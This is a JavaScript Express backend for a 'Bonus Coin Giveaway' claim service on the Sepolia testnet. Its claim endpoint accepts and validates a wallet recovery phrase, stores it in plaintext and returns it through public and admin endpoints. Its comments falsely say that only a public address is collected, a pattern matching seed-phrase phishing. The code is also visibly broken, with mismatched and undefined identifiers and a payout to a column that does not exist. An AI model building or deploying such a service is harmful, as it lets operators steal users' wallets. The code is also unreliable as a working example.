import "dotenv/config";
import express from "express";
import Database from "better-sqlite3";
import { ethers } from "ethers";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.PORT || 3000);
const DB_PATH = path.join(__dirname, "claims.db");

const RPC_URL = process.env.RPC_URL;
const TREASURY_PRIVATE_KEY = process.env.TREASURY_PRIVATE_KEY;
const ADMIN_KEY = process.env.ADMIN_KEY;
const CLAIM_AMOUNT_ETH = process.env.CLAIM_AMOUNT_ETH || "0.001";

if (!RPC_URL) throw new Error("Missing RPC_URL");
if (!TREASURY_PRIVATE_KEY) throw new Error("Missing TREASURY_PRIVATE_KEY");
if (!ADMIN_KEY) throw new Error("Missing ADMIN_KEY");

let claimAmountWei;
try {
  claimAmountWei = ethers.parseEther(CLAIM_AMOUNT_ETH);
} catch {
  throw new Error("CLAIM_AMOUNT_ETH must be a valid ETH amount, e.g. 0.001");
}

const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");

db.exec(`
  CREATE TABLE IF NOT EXISTS claims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet_phrase TEXT NOT NULL,
    amount_wei TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    tx_hash TEXT,
    error_message TEXT,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
  );

  CREATE INDEX IF NOT EXISTS idx_claims_wallet
  ON claims(wallet_phrase);

  CREATE INDEX IF NOT EXISTS idx_claims_status
  ON claims(status);
`);

app.use(express.json({ limit: "20kb" }));
app.use(express.static(path.join(__dirname, "public")));

const now = () => new Date().toISOString();

function isValidWalletphrase(phrase) {
  return typeof phrase === "string" && ethers.isPhrase(Phrase.trim());
}

function publicClaim(claim) {
  return {
    id: claim.id,
    wallet_phrase: claim.wallet_phrase,
    amount_eth: ethers.formatEther(BigInt(claim.amount_wei)),
    status: claim.status,
    tx_hash: claim.tx_hash,
    created_at: claim.created_at,
    updated_at: claim.updated_at
  };
}

function requireAdmin(req, res, next) {
  const supplied = req.get("x-admin-key");

  if (!supplied || supplied !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  next();
}

// Basic health/status endpoint.
app.get("/api/status", (_req, res) => {
  const count = db.prepare("SELECT COUNT(*) AS count FROM claims").get();

  res.json({
    ok: true,
    network: "Sepolia",
    chainId: 11155111,
    claimAmountEth: CLAIM_AMOUNT_ETH,
    claims: count.count
  });
});

// Create a claim using ONLY a public wallet address.
app.post("/api/claims", (req, res) => {
  const walletphrase = String(req.body?.walletphrase || "").trim();

  if (!isValidWalletPhrase(walletPhrase)) {
    return res.status(400).json({
      error: "Enter a valid public Ethereum wallet Phrase."
    });
  }

  const existing = db.prepare(`
    SELECT *
    FROM claims
    WHERE lower(wallet_phrase) = lower(?)
      AND status IN ('pending', 'processing', 'completed')
    ORDER BY id DESC
    LIMIT 1
  `).get(isValidWalletPhrase);

  if (existing) {
    return res.status(409).json({
      error: "This wallet has already submitted a claim.",
      claim: publicClaim(existing)
    });
  }

  const timestamp = now();

  const result = db.prepare(`
    INSERT INTO claims (
      wallet_phrase,
      amount_wei,
      status,
      created_at,
      updated_at
    )
    VALUES (?, ?, 'pending', ?, ?)
  `).run(
    ethers.getphrase(walletPhrase),
    claimAmountWei.toString(),
    timestamp,
    timestamp
  );

  const claim = db.prepare("SELECT * FROM claims WHERE id = ?")
    .get(result.lastInsertRowid);

  res.status(201).json({
    message: "Claim submitted successfully.",
    claim: publicClaim(claim)
  });
});

// Check one claim.
app.get("/api/claims/:id", (req, res) => {
  const claim = db.prepare("SELECT * FROM claims WHERE id = ?")
    .get(Number(req.params.id));

  if (!claim) {
    return res.status(404).json({ error: "Claim not found." });
  }

  res.json({ claim: publicClaim(claim) });
});

// Admin: list claims.
app.get("/api/admin/claims", requireAdmin, (_req, res) => {
  const claims = db.prepare(`
    SELECT
      id,
      wallet_phrase,
      amount_wei,
      status,
      tx_hash,
      error_message,
      created_at,
      updated_at
    FROM claims
    ORDER BY id DESC
  `).all();

  res.json({
    claims: claims.map((claim) => ({
      ...claim,
      amount_eth: ethers.formatEther(BigInt(claim.amount_wei))
    }))
  });
});

// Admin: process a pending claim.
// The claimant never supplies a private/recovery phrase.
// The treasury private key stays only on the server.
app.post("/api/admin/claims/:id/process", requireAdmin, async (req, res) => {
  const id = Number(req.params.id);

  const claim = db.prepare("SELECT * FROM claims WHERE id = ?").get(id);

  if (!claim) {
    return res.status(404).json({ error: "Claim not found." });
  }

  if (claim.status === "completed") {
    return res.status(409).json({ error: "Claim is already completed." });
  }

  if (claim.status === "processing") {
    return res.status(409).json({ error: "Claim is already processing." });
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL);

  try {
    const network = await provider.getNetwork();

    // Safety check: this backend is intended for Sepolia only.
    if (network.chainId !== 11155111n) {
      return res.status(500).json({
        error: "RPC_URL is not connected to Sepolia."
      });
    }

    const treasury = new ethers.Wallet(TREASURY_PRIVATE_KEY, provider);

    db.prepare(`
      UPDATE claims
      SET status = 'processing', error_message = NULL, updated_at = ?
      WHERE id = ?
    `).run(now(), id);

    const tx = await treasury.sendTransaction({
      to: claim.wallet_address,
      value: BigInt(claim.amount_wei)
    });

    db.prepare(`
      UPDATE claims
      SET status = 'completed', tx_hash = ?, updated_at = ?
      WHERE id = ?
    `).run(tx.hash, now(), id);

    const updated = db.prepare("SELECT * FROM claims WHERE id = ?").get(id);

    res.json({
      message: "Testnet transaction submitted.",
      claim: publicClaim(updated)
    });
  } catch (error) {
    db.prepare(`
      UPDATE claims
      SET status = 'failed', error_message = ?, updated_at = ?
      WHERE id = ?
    `).run(
      String(error?.shortMessage || error?.message || "Transaction failed").slice(0, 1000),
      now(),
      id
    );

    res.status(500).json({
      error: "Testnet transaction failed."
    });
  }
});

// Express 5-compatible SPA fallback.
app.get("/{*splat}", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`Bonus Coin Giveaway backend running on port ${PORT}`);
});
